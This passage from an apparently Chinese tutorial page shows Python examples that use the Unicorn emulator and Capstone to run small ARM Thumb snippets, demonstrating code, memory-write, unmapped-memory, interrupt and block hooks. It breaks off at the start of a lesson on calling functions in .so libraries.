class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span>  <span class="comment">#add R0,R1</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)  <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)                        <span class="comment">#输出运行后的寄存器内容</span></span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #打印内存中的值</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE"><a href="#UC-HOOK-MEM-WRITE" class="headerlink" title="UC_HOOK_MEM_WRITE"></a>UC_HOOK_MEM_WRITE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):      <span class="comment">##打印ARM32下的所有寄存器内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:   <span class="comment">#如果对内存操作是写</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:    <span class="comment">#如果对内存操作是读</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))  <span class="comment">#不会执行 应为没有内存空间写数据(没有模拟这个虚拟空间)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #打印内存中的值</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE-UNMAPPED"><a href="#UC-HOOK-MEM-WRITE-UNMAPPED" class="headerlink" title="UC_HOOK_MEM_WRITE_UNMAPPED"></a>UC_HOOK_MEM_WRITE_UNMAPPED</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED: <span class="comment">#如果对内存操作是写</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value)) <span class="comment">#写入的值应为R0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED: <span class="comment">#如果对内存操作是读</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))  </span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射一个空间存放栈数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span>=mu.mem_read(<span class="number">0x0</span>,<span class="number">4</span>)   <span class="comment">#打印内存中的值  地址根据上面的hook_mem_unmapped数据存放的位置确定</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-INTR"><a href="#UC-HOOK-INTR" class="headerlink" title="UC_HOOK_INTR"></a>UC_HOOK_INTR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookintr_t)(uc_engine *uc, uint32_t intno, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_syscall</span>(<span class="params">mu,intno,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C] mov r7,1   SVC 0</span></span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_INTR,hook_syscall)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># 打印内存中的值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-BLOCK"><a href="#UC-HOOK-BLOCK" class="headerlink" title="UC_HOOK_BLOCK"></a>UC_HOOK_BLOCK</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    mu.hook_add(UC_HOOK_BLOCK,hook_block)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># 打印内存中的值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h2 id="第三课时"><a href="#第三课时" class="headerlink" title="第三课时"></a>第三课时</h2><h3 id="调用so中函数"><a href="#调用so中函数" class="headerlink" title="调用so中函数"></a>调用so中函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 